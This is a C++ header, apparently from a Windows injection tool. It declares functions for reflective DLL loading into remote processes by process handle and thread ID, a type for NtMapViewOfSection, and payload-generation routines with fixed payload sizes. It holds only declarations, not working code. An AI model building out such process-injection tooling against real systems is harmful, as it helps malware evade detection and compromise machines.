#pragma once
#include <Windows.h>
#include "Form1.h"

#define PAYLOAD1_SIZE 71
#define PAYLOAD2_SIZE 70
#define PAYLOAD3_SIZE 75

using namespace CppCLRWinformsProjekt;

// Datatypes for PNtMapViewOfSection
typedef enum _SECTION_INHERIT {
	ViewShare = 1,
	ViewUnmap = 2
} SECTION_INHERIT;


DWORD GetReflectiveLoaderOffset(VOID* lpReflectiveDllBuffer, const char* exportedFuncName);

HANDLE WINAPI LoadRemoteLibraryR(int payload_type, HANDLE hProcess);

HANDLE WINAPI LoadRemoteLibraryR2(int payload_type, HANDLE hProcess);

void WINAPI LoadRemoteLibraryR3(int payload_type, HANDLE hProcess, DWORD tid);

void WINAPI LoadRemoteLibraryR4(int payload_type, HANDLE hProcess, DWORD tid);

void WINAPI LoadRemoteLibraryR5(int payload_type);





// Generating Payload.
void* memmem(const void* haystack, size_t haystack_len, const void* const needle, const size_t needle_len);
char* _gen_payload_1();
char* _gen_payload_2();
char* _gen_payload_3();